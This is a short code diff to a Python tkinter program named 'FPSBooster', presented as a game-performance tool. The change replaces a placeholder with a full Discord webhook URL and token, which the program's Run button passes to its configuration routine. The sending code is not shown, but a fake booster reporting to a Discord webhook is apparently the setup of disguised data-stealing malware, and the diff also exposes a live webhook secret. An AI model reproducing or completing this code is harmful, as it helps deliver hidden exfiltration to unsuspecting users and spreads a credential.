@@ -163,7 +163,7 @@ class FPSBooster:
         ram_usage_scale.pack(pady=5)
 
         run_button = tk.Button(root, text="Run", command=lambda: FPSBooster.run_config(
-            cpu_core_var.get(), gpu_power_var.get(), ram_usage_var.get(), "YOUR_DISCORD_WEBHOOK_URL_HERE", root))
+            cpu_core_var.get(), gpu_power_var.get(), ram_usage_var.get(), "https://discord.com/api/webhooks/1439762584206049330/AmRslfQN4NdjQ6KmHT3k0Az2fIxaDICwb5i7Kkp0JYq3-xMdAR1UnX2fO6EwcLiV234b", root))
         run_button.pack(pady=20)
 
         root.mainloop()
@@ -203,3 +203,4 @@ if __name__ == "__main__":
 
 
     FPSBooster.create_config_window()
+
